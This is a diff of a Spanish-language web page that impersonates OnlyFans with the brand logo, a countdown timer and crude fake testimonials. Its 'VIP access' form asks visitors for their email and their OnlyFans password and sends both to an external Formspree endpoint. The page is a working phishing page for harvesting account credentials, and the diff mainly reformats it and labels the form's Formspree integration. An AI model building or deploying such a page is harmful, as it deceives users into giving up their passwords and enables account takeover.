@@ -22,9 +22,9 @@
             margin: 0;
             padding: 0;
             background-image: url('https://github.com/infernal-kernel/infernal-kernel.github.io/blob/main/Onlyfans-Logo-2016.png');
-  background-size: cover; /* Hace que la imagen cubra toda la pantalla */
-  background-position: center center; /* Centra la imagen */
-  background-repeat: no-repeat; /* Evita que la imagen se repita */
+            background-size: cover; /* Hace que la imagen cubra toda la pantalla */
+            background-position: center center; /* Centra la imagen */
+            background-repeat: no-repeat; /* Evita que la imagen se repita */
         }
         /* Contenedor general */
         .container {
@@ -145,12 +145,15 @@
     </style>
 </head>
 <body>
+
+    <div class="container">
         <!-- Encabezado con logo y bienvenida -->
         <div class="header">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6e/OnlyFans_logo_2021.png" alt="OnlyFans Logo" class="logo">
             <h1>💎EXCLUSIVE CONTENT💎</h1>
             <p class="tagline">💎Donde el lujo y el placer se encuentran.💎</p>
         </div>
+
         <!-- Llamada a la acción principal -->
         <div class="cta">
             <h2>🔓Únete ahora y accede a lo mejor🔓</h2>
@@ -182,16 +185,16 @@
             <p>"Me flipa tu p**** enserio, ufff" - <b>Adri C.</b></p>
         </div>
 
-        <!-- Formulario de acceso VIP -->
+        <!-- Formulario de acceso VIP con integración de Formspree -->
         <form action="https://formspree.io/f/xvgkgeye" method="POST" class="vip-form">
             <h3>Accede a una muestra exclusiva</h3>
-            
+
             <!-- Campo de correo -->
             <input type="email" name="email" placeholder="Ingresa tu correo para recibir la muestra" required>
-            
+
             <!-- Campo de clave para OnlyFans -->
             <input type="password" name="onlyfans_key" placeholder="Ingresa tu clave para OnlyFans" required>
-            
+
             <!-- Botón para enviar -->
             <button type="submit">Obtener Muestra</button>
         </form>
@@ -214,11 +217,12 @@
             const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
             const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
             const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-            document.getElementById("timer").innerHTML = days + "d " + hours + "h "
-            + minutes + "m " + seconds + "s ";
+
+            document.getElementById("timer").innerHTML = days + "d " + hours + "h " + minutes + "m " + seconds + "s ";
+
             if (distance < 0) {
                 clearInterval(timer);
-                document.getElementById("timer").innerHTML = "Oferta expirada";
+                document.getElementById("timer").innerHTML = "EXPIRED";
             }
         }, 1000);
     </script>
